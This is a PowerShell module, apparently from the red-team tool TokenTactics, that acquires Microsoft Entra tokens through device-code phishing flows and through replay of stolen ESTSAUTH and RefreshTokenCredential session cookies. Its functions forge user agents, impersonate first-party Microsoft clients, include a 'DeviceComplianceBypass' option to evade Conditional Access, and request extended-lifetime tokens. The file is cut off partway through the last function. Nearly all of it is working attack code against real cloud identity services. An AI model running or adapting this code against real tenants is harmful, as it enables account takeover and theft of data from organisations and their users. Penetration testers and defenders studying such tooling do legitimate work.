function Get-AzureToken {
    <#
    .DESCRIPTION
        Generate a device code to be used at https://www.microsoft.com/devicelogin. Once a user has successfully authenticated, you will be presented with a JSON Web Token JWT in the variable $response.
    .EXAMPLE
        Get-AzureToken -Client Substrate
    #>
    [CmdletBinding(DefaultParameterSetName = 'Default')]
    Param(
        [Parameter(
            Mandatory = $False,
            ParameterSetName = 'Default'
        )]
        [ValidateSet("Yammer", "Outlook", "MSTeams", "Graph", "AzureCoreManagement", "AzureManagement", "MSGraph", "DODMSGraph", "Custom", "Substrate", "SharePoint")]
        [String[]]$Client = "MSGraph",
        [Parameter(
            Mandatory = $False,
            ParameterSetName = 'Default'
        )]
        [String]$ClientID,
        [Parameter(
            Mandatory = $False,
            ParameterSetName = 'Default'
        )]
        [String]$Scope,
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE,
        [Parameter(
            Mandatory = $false,
            ParameterSetName = 'SharePoint'
        )]
        [string]$SharePointTenantName,
        [Parameter(
            Mandatory = $false,
            ParameterSetName = 'SharePoint')]
        [switch]$UseAdmin,
        [Alias("Domain")]
        [string]$ResourceTenant = "common"
    )
    if ($CustomUserAgent) {
        $UserAgent = $CustomUserAgent
    } elseif ($Device) {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent -Device $Device
        }
    } elseif ($Browser) {
        $UserAgent = Get-ForgedUserAgent -Browser $Browser
    } else {
        $UserAgent = Get-ForgedUserAgent
    }
    # Set Headers
    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    # Set Body based on Client selected
    if ($Client -eq "Outlook") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://outlook.office365.com/.default offline_access openid"
        }
    } elseif ($Client -eq "Substrate") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://substrate.office.com/.default offline_access openid"
        }
    } elseif ($Client -eq "Yammer") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "resource"  = "https://www.yammer.com/.default offline_access openid"
        }
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = $Scope
        }
    } elseif ($Client -eq "MSTeams") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://api.spaces.skype.com/.default offline_access openid"
        }
    } elseif ($Client -eq "Graph") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://graph.windows.net/.default offline_access openid"
        }
    } elseif ($Client -eq "MSGraph") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://graph.microsoft.com/.default offline_access openid"
        }
    } elseif ($Client -eq "DODMSGraph") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://dod-graph.microsoft.us/.default offline_access openid"
        }
    } elseif ($Client -eq "AzureCoreManagement") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://management.core.windows.net/.default offline_access openid"
        }
    } elseif ($Client -eq "AzureManagement") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://management.azure.com/.default offline_access openid"
        }
    } elseif ($Client -eq "OneDrive") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "ab9b8c07-8f02-4f72-87fa-80105867a763"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://officeapps.live.com/.default offline_access openid"
        }
    }

    if ($UseAdmin) {
        $AdminSuffix = "-admin"
    } else {
        $AdminSuffix = ""
    }

    if ($PSBoundParameters.ContainsKey('SharePointTenantName')) {
        Write-Verbose "SharePoint Tenant Name is set. Defaulting to SharePoint client"
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            $ClientID = "9bc3ab49-b65d-410a-85ad-de819febfddc"
            Write-Verbose "ClientID not provided, using default value: $ClientID"
        }
        $body = @{
            "client_id" = $ClientID
            "scope"     = "https://$SharePointTenantName$AdminSuffix.sharepoint.com/Sites.FullControl.All offline_access openid"
        }
    }

    if ($client -match "DOD") {
        $BaseUrl = "login.microsoftonline.us"
    } else {
        $BaseUrl = "login.microsoftonline.com"
    }

    # Login Process
    Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
    try {
        $authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://$BaseUrl/$ResourceTenant/oauth2/v2.0/devicecode" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
    } catch {
        Write-Verbose ( $_.Exception.Message )
        throw $_.Exception.Message
    }
    Write-Output $authResponse
    $continue = $true
    $interval = $authResponse.interval
    $expires = $authResponse.expires_in
    $body = @{
        "client_id"   = $body['client_id']
        "grant_type"  = "urn:ietf:params:oauth:grant-type:device_code"
        "device_code" = $authResponse.device_code
    }
    Write-Verbose ($body | ConvertTo-Json -Depth 99)
    if ($UseCAE) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
        $body.Add("claims", $Claims)
        Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
    }
    while ($continue) {
        Start-Sleep -Seconds $interval
        $total += $interval

        if ($total -gt $expires) {
            Write-Error "Timeout occurred"
            return
        }
        # Remove response if it exists
        Remove-Variable -Name response -Scope global -ErrorAction SilentlyContinue
        # Try to get the response. Will give 40x while pending so we need to try&catch
        try {
            $global:response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://$BaseUrl/$ResourceTenant/oauth2/v2.0/token" -Headers $Headers -Body $body -ErrorAction SilentlyContinue
        } catch {
            # This is normal flow, always returns 40x unless successful
            $details = $_.ErrorDetails.Message | ConvertFrom-Json
            Write-Verbose "Error: $($details.error)"
            $continue = $details.error -eq "authorization_pending"
        }

        # If we got response, all okay!
        if ($response) {
            Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
            $output = ConvertFrom-JWTtoken -token $response.access_token
            $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
            $global:TokenUpn = $output.upn
            break
        } elseif ($null -eq $response -and $continue) {
            Write-Output "$([char]0x25CB)  Waiting for user to authenticate"
        } else {
            Write-Output "$([char]0x274C) Could not get tokens $($details.error_description)"
            return
        }
    }
}

function Get-AzureTokenFromCookie {

    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow and a cookie
        Authenticates to MSGraph as Teams FOCI client by default.
        https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow

    .EXAMPLE
        Get-AzureTokenFromCookie -CookieType ESTSAUTHPERSISTENT -CookieValue "0.AbcAp.."

    .AUTHOR
        Adapted for PowerShell by https://github.com/rotarydrone from ROADtools by https://github.com/dirkjanm
        https://github.com/rvrsh3ll/TokenTactics/pull/9
        https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx)#selenium-based-authentication

        Extended to support appverify endpoint, multiple cookie formats and full error handling by Fabian Bader
    #>

    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String[]]
        $CookieType,
        [Parameter(Mandatory = $True)]
        [String[]]
        $CookieValue,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $true)]
        [String]$ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264", # Microsoft Teams
        [Parameter(Mandatory = $False)]
        [String]$Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $true)]
        [String]$Scope = "openid offline_access",
        [Parameter(Mandatory = $true)]
        [String]$RedirectUrl,
        [Parameter(Mandatory = $false)]
        [switch]$UseCodeVerifier,
        [Parameter(Mandatory = $false)]
        [switch]$UseV1Endpoint
    )

    if ($Device) {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent -Device $Device
        }
    } else {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent
        }
    }

    Write-Verbose "ClientID: $ClientID"
    if ($Resource) {
        Write-Verbose "Resource: $Resource"
    }
    Write-Verbose "Scope: $Scope"
    Write-Verbose "RedirectUrl: $RedirectUrl"
    Write-Verbose "CookieType: $CookieType"
    Write-Verbose "UserAgent: $UserAgent"

    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent

    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    $session.UserAgent = $UserAgent
    # Add basic cookies to the session
    $null = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "https://login.microsoftonline.com/error"
    $cookie = [System.Net.Cookie]::new($CookieType, $CookieValue)
    $session.Cookies.Add('https://login.microsoftonline.com/', $cookie)
    $SessionCookies = $session.Cookies.GetCookies('https://login.microsoftonline.com') | Select-Object -ExpandProperty Name
    Write-Verbose "Session cookies: $( $SessionCookies -join ', ' )"

    $state = [System.Guid]::NewGuid().ToString()
    $redirect_uri = ([System.Uri]::EscapeDataString($RedirectUrl))

    # Get the authorization code from the STS
    if ($UseV1Endpoint) {
        $Uri = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=$($ClientID)&resource=$($Resource)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
    } else {
        $Uri = "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?response_type=code&client_id=$($ClientID)&scope=$($Scope)&redirect_uri=$($redirect_uri)&state=$($state)"
    }
    if ($UseCodeVerifier) {
        $CodeVerifier = Get-TTCodeVerifier
        $CodeChallenge = Get-TTCodeChallenge -CodeVerifier $CodeVerifier
        $Uri += "&code_challenge=$CodeChallenge&code_challenge_method=S256"
    }
    if ($UseCAE -and ( $UseV1Endpoint -eq $false )) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $Uri += "&claims=" + ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
    }
    Write-Verbose "Requesting URL: $Uri"
    Write-Output "$([char]0x2718)  Calling authorization endpoint with $CookieType cookie"
    if ($PSVersionTable.PSEdition -ne "Core") {
        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
    } else {
        $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri $Uri -Headers $Headers
    }

    Write-Verbose "Status code: $($sts_response.StatusCode)"
    if ( $sts_response.StatusCode -eq 200 -and $sts_response.RawContent -match "\`$Config=(.*);" ) {
        Write-Verbose "AppConfig found in initial response"
        $AppConfig = $Matches[1] | ConvertFrom-Json
        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
        #region error handling
        if ( -not [string]::IsNullOrWhiteSpace( $AppConfig.sErrorCode ) ) {
            Invoke-EntraErrorHandling -AppConfig $AppConfig
            return
        }
        #endregion

        #region CmsiInterrupt - For security reasons, user confirmation is required for this request. Interrupt is shown for all scheme redirects in mobile browsers.
        if ( $AppConfig.pgid -eq "CmsiInterrupt" ) {
            Write-Output "$([char]0x2718)  AADSTS50199: CmsiInterrupt"
            Write-Output "   For security reasons, user confirmation is required for this application: $($AppConfig.sAppName)."
            Write-Output "$([char]0x2718)  urlPost URL: $($AppConfig.urlPost)"
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sDeviceId)) {
                Write-Output "$([char]0x2718)  Device Id: $($AppConfig.sDeviceId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.correlationId)) {
                Write-Output "$([char]0x2718)  Correlation Id: $($AppConfig.correlationId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sessionId)) {
                Write-Output "$([char]0x2718)  Session Id: $($AppConfig.sessionId)"
            }
            if ( -not [string]::IsNullOrWhiteSpace($AppConfig.sPOST_Username)) {
                Write-Output "$([char]0x2718)  Username: $($AppConfig.sPOST_Username)"
            }
            $Uri = "https://login.microsoftonline.com/appverify"
            $Body = @{
                "ContinueAuth"    = "true"
                "i19"             = "$(Get-Random -Minimum 1000 -Maximum 9999)"
                "canary"          = $AppConfig.canary
                "iscsrfspeedbump" = "false"
                "flowToken"       = $AppConfig.sFT
                "hpgrequestid"    = $sts_response.Headers['x-ms-request-id']
                "ctx"             = $AppConfig.sCtx
            }
            if ($PSVersionTable.PSEdition -ne "Core") {
                $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
            } else {
                $sts_response = Invoke-WebRequest -UseBasicParsing -SkipHttpErrorCheck -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Post -Uri $Uri -Headers $Headers -Body $Body
            }
        }
        #endregion
    }
    

    Write-Debug "Response: $($sts_response.RawContent)"
    #region Manual sign-in required
    if ($sts_response.StatusCode -eq 302 -and $sts_response.Headers.Location -notmatch "code=") {
        Write-Verbose "$([char]0x2718)  Single sign-on failed. Redirected to $($sts_response.Headers.Location)"
        $sts_response = Invoke-WebRequest -UseBasicParsing -MaximumRedirection 0 -ErrorAction SilentlyContinue -WebSession $session -Method Get -Uri "$($sts_response.Headers.Location)" -Headers $Headers
        if ( $sts_response.RawContent -match "\`$Config=(.*);" ) {
            $AppConfig = $Matches[1] | ConvertFrom-Json
            Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99 )"
            Invoke-EntraErrorHandling -AppConfig $AppConfig
        } else {
            Write-Output "$([char]0x2718)  Could not find AppConfig in response"
            Write-Output "    Unknown error occurred"
            Write-Debug "Response: $($sts_response.RawContent)"
        }
        return
    }
    #endregion

    if ($sts_response.StatusCode -eq 302) {
        if ($PSVersionTable.PSEdition -ne "Core") {
            $RequestURL = $sts_response.Headers.Location
        } else {
            $RequestURL = $sts_response.Headers.Location[0]
        }
        $queryParams = ConvertTo-URLParameters -RequestURL $RequestURL

        # When code is present, we have a valid refresh token and can use it to request a new token
        if ($queryParams.ContainsKey('code')) {
            $AuthorizationCode = $queryParams['code']
            Write-Verbose "Authorization Code: $($AuthorizationCode[0..10] -join '' )..."
        } else {
            Write-Output "$([char]0x2718)  Code not found in redirected URL path"
            Write-Output "    Requested URL: $($RequestURL)"
            Write-Output "    Response Code: $($sts_response.StatusCode)"
            Write-Output "    Response URI:  $($sts_response.Headers.Location)"
            return
        }
    } else {
        $sts_response.RawContent -match "\`$Config=(.*);" | Out-Null
        $AppConfig = $Matches[1] | ConvertFrom-Json
        Write-Debug "AppConfig: $($AppConfig | ConvertTo-Json -Depth 99)"
        Invoke-EntraErrorHandling -AppConfig $AppConfig
        return
    }

    if ($AuthorizationCode) {
        $body = @{
            "client_id"    = $ClientID
            "grant_type"   = "authorization_code"
            "redirect_uri" = $RedirectUrl
            "code"         = $AuthorizationCode
            "scope"        = $Scope
        }
        if ($UseV1Endpoint) {
            $body.Add("resource", $Resource)
        }
        if ($UseCAE -and ( $UseV1Endpoint -eq $false )) {
            # Add 'cp1' as client claim to get a access token valid for 24 hours
            $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
            $body.Add("claims", $Claims)
        }
        if ($CodeVerifier) {
            $body.Add("code_verifier", $CodeVerifier)
        }
        Write-Verbose "Calling token endpoint with Authorization Code"
        Write-Verbose ( $body | ConvertTo-Json -Depth 99 )

        try {
            if ($UseV1Endpoint) {
                $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/token"
            } else {
                $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
            }
            $global:response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $TokenEndpointUri -Headers $Headers -Body $body
            $output = ConvertFrom-JWTtoken -token $response.access_token
            $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
            $global:TokenUpn = $output.upn
            Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
        } catch {
            Write-Error "Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
        }
    }
}

function Get-AzureTokenFromESTSCookie {

    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow using an ESTS cookie for authentication.

    .EXAMPLE
        Get-AzureTokenFromESTSCookie -Client MSTeams -ESTSAuthCookie "0.AbcAp.."

    .AUTHOR
        Fabian Bader
    #>

    [CmdletBinding()]
    Param(
        [Alias("ESTSAuthCookie")]
        [Parameter(Mandatory = $True)]
        [String[]]
        $CookieValue,
        [ValidateSet("ESTSAUTHPERSISTENT", "ESTSAUTH")]
        $ESTSCookieType = "ESTSAUTHPERSISTENT",
        [Parameter(Mandatory = $False)]
        [String[]]
        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "AzureManagement", "DeviceComplianceBypass", "Custom")]
        $Client = "MSTeams",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [String]$ClientID,
        [Parameter(Mandatory = $False)]
        [String]$Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $False)]
        [String]$Scope = "openid offline_access",
        [Parameter(Mandatory = $False)]
        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
    )


    if ($Client -eq "MSTeams") {
        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    } elseif ($Client -eq "MSEdge") {
        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
    } elseif ($Client -eq "AzurePowershell") {
        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
    } elseif ($Client -eq "DeviceComplianceBypass") {
        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
    } elseif ($Client -eq "AzureManagement") {
        $ClientID = "84070985-06ea-473d-82fe-eb82b4011c9d"
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
    }

    $Parameters = @{
        "CookieType"  = $ESTSCookieType
        "CookieValue" = $CookieValue
        "ClientID"    = $ClientID
        "Scope"       = $Scope
        "RedirectUrl" = $RedirectUrl
        "Verbose"     = $VerbosePreference
    }
    if ($CustomUserAgent) {
        $Parameters.Add("UserAgent", $CustomUserAgent)
    } elseif ($Device) {
        if ($Browser) {
            $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Device $Device -Browser $Browser))
        } else {
            $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Device $Device))
        }
    } elseif ($Browser) {
        $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Browser $Browser))
    } else {
        $Parameters.Add("UserAgent", (Get-ForgedUserAgent))
    }

    if ($Device) {
        $Parameters.Add("Device", $Device)
    }
    if ($Browser) {
        $Parameters.Add("Browser", $Browser)
    }
    Get-AzureTokenFromCookie @Parameters
}

function Get-AzureTokenFromRefreshTokenCredentialCookie {
    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow using an x-ms-RefreshTokenCredential cookie for authentication.

    .EXAMPLE
        Get-AzureTokenFromRefreshTokenCredentialCookie -Client MSTeams -RefreshTokenCredential "eyJhbGciOiJ..."

    .AUTHOR
        Fabian Bader
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String[]]
        $RefreshTokenCredential,
        [Parameter(Mandatory = $False)]
        [String[]]
        [ValidateSet("MSTeams", "MSEdge", "AzurePowershell", "AzureManagement", "DeviceComplianceBypass", "Custom")]
        $Client = "MSTeams",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [String]$ClientID,
        [Parameter(Mandatory = $False)]
        [String]$Resource = "https://graph.microsoft.com",
        [Parameter(Mandatory = $False)]
        [String]$Scope = "openid offline_access",
        [Parameter(Mandatory = $False)]
        [String]$RedirectUrl = "https://login.microsoftonline.com/common/oauth2/nativeclient"
    )


    if ($Client -eq "MSTeams") {
        $ClientID = "1fec8e78-bce4-4aaf-ab1b-5451cc387264"
    } elseif ($Client -eq "MSEdge") {
        $ClientID = "ecd6b820-32c2-49b6-98a6-444530e5a77a"
    } elseif ($Client -eq "AzurePowershell") {
        $ClientID = "1950a258-227b-4e31-a9cf-717495945fc2"
    } elseif ($Client -eq "DeviceComplianceBypass") {
        $ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"
        $RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="
    } elseif ($Client -eq "AzureManagement") {
        $ClientID = "84070985-06ea-473d-82fe-eb82b4011c9d"
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
    }
    $Parameters = @{
        "CookieType"  = "x-ms-RefreshTokenCredential"
        "CookieValue" = $RefreshTokenCredential
        "ClientID"    = $ClientID
        "Scope"       = $Scope
        "RedirectUrl" = $RedirectUrl
        "Verbose"     = $VerbosePreference
    }
    if ($CustomUserAgent) {
        $Parameters.Add("UserAgent", $CustomUserAgent)
    } elseif ($Device) {
        if ($Browser) {
            $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Device $Device -Browser $Browser))
        } else {
            $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Device $Device))
        }
    } elseif ($Browser) {
        $Parameters.Add("UserAgent", (Get-ForgedUserAgent -Browser $Browser))
    } else {
        $Parameters.Add("UserAgent", (Get-ForgedUserAgent))
    }

    if ($Device) {
        $Parameters.Add("Device", $Device)
    }
    if ($Browser) {
        $Parameters.Add("Browser", $Browser)
    }
    if ($Resource) {
        $Parameters.Add("Resource", $Resource)
    }
    Get-AzureTokenFromCookie @Parameters
}

function Get-AzureTokenFromAuthorizationCode {
    <#
    .DESCRIPTION
        Authenticate to an application (default graph.microsoft.com) using Authorization Code flow.
        Authenticates to MSGraph as Teams FOCI client by default.
        https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-auth-code-flow

    .EXAMPLE
        Get-AzureTokenFromAuthorizationCode -Client MSGraph -AuthorizationCode "1.AXkAT2xo4yev..."

    .AUTHOR
        Adapted for TokenTactics from the original code by
        @gladstomych https://github.com/JumpsecLabs/TokenSmith and
        @zh54321 https://github.com/zh54321/PoCEntraDeviceComplianceBypass/blob/main/poc_entra_compliance_bypass.ps1

        First published by @_dirkjan: https://bsky.app/profile/dirkjanm.io/post/3ld4nbbhqd222
    #>
    [CmdletBinding()]
    Param(
        [ValidateSet("MSGraph", "Graph", "DeviceRegistration", "Custom")]
        [string]$Client = "MSGraph",
        [Parameter(Mandatory = $True, ParameterSetName = 'Default')]
        [string]$AuthorizationCode,
        [Parameter(ParameterSetName = 'Default')]
        [String]$RedirectUrl = "ms-appx-web://Microsoft.AAD.BrokerPlugin/S-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113",
        [Parameter(Mandatory = $True, ParameterSetName = 'RequestURL')]
        [string[]]$RequestURL,
        [Parameter(Mandatory = $False)]
        [String]$ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
        [Parameter(Mandatory = $False)]
        [String]$Scope,
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'AndroidMobile', 'iPhone')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [switch]$UseCAE,
        [Parameter(Mandatory = $False)]
        [string]$CodeVerifier,
        [Parameter(Mandatory = $False)]
        [string]$UseV1Endpoint,
        [Parameter(Mandatory = $False)]
        [string]$Resource
    )

    #region Set Headers
    if ($CustomUserAgent) {
        $UserAgent = $CustomUserAgent
    } elseif ($Device) {
        if ($Browser) {
            $UserAgent = Get-ForgedUserAgent -Device $Device -Browser $Browser
        } else {
            $UserAgent = Get-ForgedUserAgent -Device $Device
        }
    } elseif ($Browser) {
        $UserAgent = Get-ForgedUserAgent -Browser $Browser
    } else {
        $UserAgent = Get-ForgedUserAgent
    }
    $Headers = @{}
    $Headers["User-Agent"] = $UserAgent
    #endregion

    #region Extract values from RequestURL
    if ($RequestURL) {
        $queryParams = ConvertTo-URLParameters -RequestURL $RequestURL
        # When code is present, we have a valid authorization code and can use it to request a new token
        if ($queryParams.ContainsKey('code')) {
            $AuthorizationCode = $queryParams['code']
            Write-Verbose "Code: $($AuthorizationCode[0..10])..."
            Write-Debug "Code: $AuthorizationCode"
        } else {
            Write-Warning "Code not found in redirected URL path. Aborting..."
            return
        }
        $uri = [System.Uri]::new($RequestURL)
        $RedirectUrl = $uri.GetLeftPart([System.UriPartial]::Path)
        if ([string]::IsNullOrWhiteSpace($RedirectUrl)) {
            Write-Warning "Redirect URL not found in redirected URL path. Aborting..."
            return
        } else {
            Write-Verbose "Redirect URL: $RedirectUrl"
        }
    }
    #endregion

    #region Create Body based on Client selected
    $body = @{
        "grant_type"   = "authorization_code"
        "redirect_uri" = $RedirectUrl
        "code"         = $AuthorizationCode
    }

    if ($Client -ne "Custom" -and -not ( [string]::IsNullOrWhiteSpace($Scope) )) {
        Write-Warning "Custom scope is set but client is not set to Custom. Ignoring scope."
    }
    if ($Client -eq "Graph") {
        $body.Add("scope", "https://graph.windows.net/.default offline_access openid")
    } elseif ($Client -eq "MSGraph") {
        $body.Add("scope", "https://graph.microsoft.com/.default offline_access openid")
    } elseif ($Client -eq "DeviceRegistration") {
        # Device Registration Service
        $body.Add("scope", "01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9")
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
        $body.Add("scope", $Scope)
    }
    $body.Add("client_id", $ClientID)

    if ($UseCAE -and ( $UseV1Endpoint -eq $false )) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
